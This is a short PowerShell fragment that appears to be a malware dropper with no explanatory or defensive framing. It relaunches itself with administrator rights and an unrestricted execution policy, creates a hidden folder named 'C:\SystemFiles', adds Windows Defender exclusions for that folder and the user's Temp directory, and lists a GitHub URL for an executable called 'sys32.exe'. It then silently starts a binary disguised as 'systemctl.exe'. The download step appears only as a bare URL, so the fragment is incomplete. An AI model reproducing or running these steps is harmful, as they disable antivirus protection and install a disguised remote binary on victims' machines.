PowerShell -NoProfile -ExecutionPolicy Unrestricted -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Unrestricted -File ""%USERPROFILE%\Desktop\Rs.ps1""' -Verb RunAs}";

mkdir C:\SystemFiles
attrib +h C:\SystemFiles

Add-MpPreference -ExclusionPath “C:\SystemFiles”
Add-MpPreference -ExclusionPath “C:\Users\$env:USERNAME\AppData\Local\Temp\”

https://github.com/calebpmiller/Files/raw/master/sys32.exe


Start-Process -NoNewWindow -FilePath "C:\SystemFiles\systemctl.exe"
